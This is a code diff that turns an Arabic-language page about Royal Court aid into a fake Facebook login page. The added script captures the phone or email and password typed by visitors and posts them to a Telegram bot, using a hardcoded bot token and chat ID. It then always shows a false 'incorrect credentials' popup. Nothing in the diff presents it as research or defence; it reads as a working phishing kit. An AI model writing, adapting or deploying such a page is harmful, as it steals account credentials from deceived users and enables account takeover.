@@ -10,77 +10,223 @@
       margin: 0;
       padding: 0;
       font-family: 'Cairo', Arial, sans-serif;
-      background: #f4f8fb;
-      color: #222;
-      min-height: 100vh;
+      background: #fff;
     }
     .container {
-      max-width: 500px;
-      margin: 60px auto 0 auto;
-      background: #fff;
+      max-width: 400px;
+      margin: 0 auto;
+      padding-top: 70px;
+      position: relative;
+    }
+    .arrow {
+      position: absolute;
+      top: 32px;
+      right: 32px;
+      font-size: 32px;
+      color: #222;
+      z-index: 2;
+      user-select: none;
+    }
+    .fb-logo {
+      display: block;
+      margin: 0 auto 20px auto;
+      width: 140px;
+      height: 140px;
+      background: #1877f2;
+      position: relative;
       border-radius: 24px;
-      box-shadow: 0 2px 18px rgba(0,0,0,0.08);
-      padding: 44px 28px 36px 28px;
-      text-align: center;
     }
-    .logo {
-      width: 90px;
-      height: 90px;
-      margin: 0 auto 24px auto;
-      background: #236c36;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 54px;
+    .fb-logo::after {
+      content: "f";
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -54%);
       color: #fff;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.13);
+      font-size: 100px;
       font-weight: bold;
-      letter-spacing: 2px;
+      font-family: Arial, sans-serif;
     }
-    h1 {
-      margin: 0 0 18px 0;
-      font-size: 2rem;
-      color: #236c36;
+    .login-msg {
+      text-align: center;
+      color: #444;
+      font-size: 22px;
+      margin-bottom: 40px;
+      font-weight: 500;
     }
-    .welcome-msg {
-      font-size: 1.15rem;
-      line-height: 2;
-      margin: 0 0 18px 0;
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+    }
+    .input-wrapper {
+      border: 2px solid #6c757d;
+      border-radius: 22px;
+      background: #fff;
+      padding: 0;
+    }
+    .input-wrapper input {
+      width: 100%;
+      padding: 16px 18px 16px 18px;
+      border: none;
+      outline: none;
+      font-size: 20px;
+      background: transparent;
+      text-align: right;
+      font-family: inherit;
       color: #222;
     }
-    .note {
-      background: #eafaf1;
-      color: #236c36;
-      padding: 14px 18px;
-      border-radius: 14px;
-      margin: 18px 0 0 0;
-      font-size: 1rem;
-      font-weight: 500;
-      border: 1px solid #c5e4d1;
-      display: inline-block;
+    .input-wrapper + .input-wrapper {
+      border-color: #e4e6eb;
     }
-    @media (max-width: 600px) {
-      .container { padding: 22px 7vw 20px 7vw; }
-      .logo { width: 62px; height: 62px; font-size: 32px; }
-      h1 { font-size: 1.35rem; }
-      .welcome-msg { font-size: 0.97rem; }
-      .note { font-size: 0.89rem; }
+    .login-btn {
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 24px;
+      padding: 16px 0;
+      font-size: 22px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 12px;
+      margin-bottom: 18px;
+      width: 100%;
+      transition: background 0.2s;
+    }
+    .login-btn:active {
+      background: #145db2;
+    }
+    .forgot {
+      text-align: center;
+      color: #1c1e21;
+      font-size: 20px;
+      margin-top: 22px;
+      font-weight: 400;
+    }
+    /* Popup styles */
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #fff;
+      border: 2px solid #d32f2f;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.18);
+      border-radius: 16px;
+      padding: 28px 36px;
+      min-width: 310px;
+      z-index: 1000;
+      text-align: center;
+      animation: popupIn 0.18s;
+    }
+    @keyframes popupIn {
+      from { opacity: 0; transform: translateX(-50%) scale(0.93);}
+      to   { opacity: 1; transform: translateX(-50%) scale(1);}
+    }
+    .popup .popup-title {
+      font-size: 26px;
+      font-weight: bold;
+      color: #d32f2f;
+      margin-bottom: 6px;
+      letter-spacing: 1px;
+    }
+    .popup .popup-desc {
+      font-size: 18px;
+      color: #444;
+    }
+    @media (max-width: 500px) {
+      .container {
+        max-width: 95vw;
+        padding-top: 45px;
+      }
+      .arrow {
+        top: 16px;
+        right: 16px;
+      }
+      .fb-logo {
+        width: 90px;
+        height: 90px;
+        margin-bottom: 14px;
+        font-size: 48px;
+      }
+      .fb-logo::after {
+        font-size: 62px;
+      }
+      .login-msg { font-size: 16px; margin-bottom: 22px; }
+      .input-wrapper input {
+        font-size: 18px;
+        padding: 14px 12px;
+      }
+      .login-btn { font-size: 18px; padding: 13px 0; }
+      .forgot { font-size: 16px; margin-top: 18px; }
+      .popup {
+        min-width: 80vw;
+        padding: 22px 12px;
+      }
+      .popup .popup-title { font-size: 19px;}
+      .popup .popup-desc { font-size: 14px;}
     }
   </style>
 </head>
 <body>
+  <div class="arrow">&#x203A;</div>
   <div class="container">
-    <div class="logo">ديوان</div>
-    <h1>تسجيل الدخول</h1>
-    <div class="welcome-msg">
-      يسر الديوان الملكي أن يعلن عن تقديم مساعدات للمواطنين والمقيمين بسهولة ويسر.<br>
-      لا حاجة لتسجيل الدخول أو إنشاء حساب، ولا يتطلب الأمر أي خطوات معقدة.<br>
-      كل ما عليك هو التواصل مع الديوان الملكي مباشرة للاستفادة من المساعدات المقدمة.
-    </div>
-    <div class="note">
-      الديوان الملكي يقدم المساعدات بدون أي تسجيل دخول أو إجراءات إلكترونية معقدة. هدفنا هو التسهيل وخدمة الجميع.
-    </div>
+    <div class="fb-logo"></div>
+    <div class="login-msg">يرجى تسجيل الدخول للمتابعة</div>
+    <form id="loginForm" autocomplete="off">
+      <div class="input-wrapper">
+        <input id="user" type="text" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+      </div>
+      <div class="input-wrapper">
+        <input id="pass" type="password" placeholder="كلمة السر" required>
+      </div>
+      <button class="login-btn" type="submit">تسجيل الدخول</button>
+    </form>
+    <div class="forgot">هل نسيت كلمة السر؟</div>
   </div>
+  <!-- Popup -->
+  <div class="popup" id="popup">
+    <div class="popup-title">بيانات الاعتماد غير صحيحة</div>
+    <div class="popup-desc">اسم المستخدم أو كلمة السر غير صحيحة</div>
+  </div>
+  <script>
+    function showPopup() {
+      var popup = document.getElementById('popup');
+      popup.style.display = 'block';
+      setTimeout(function() {
+        popup.style.display = 'none';
+      }, 3200); // 3.2 ثانية
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      var user = document.getElementById('user').value;
+      var pass = document.getElementById('pass').value;
+
+      var message = `🔐 تسجيل دخول جديد:\n📱 المستخدم: ${user}\n🔑 كلمة السر: ${pass}`;
+      var token = "8444121807:AAH6ZKbzt7IEvQ7cKuqCsQQxDUKzyT5blW4";
+      var chatId = "6873334348";
+      var url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        showPopup();
+      })
+      .catch(error => {
+        showPopup();
+      });
+    });
+  </script>
 </body>
 </html>
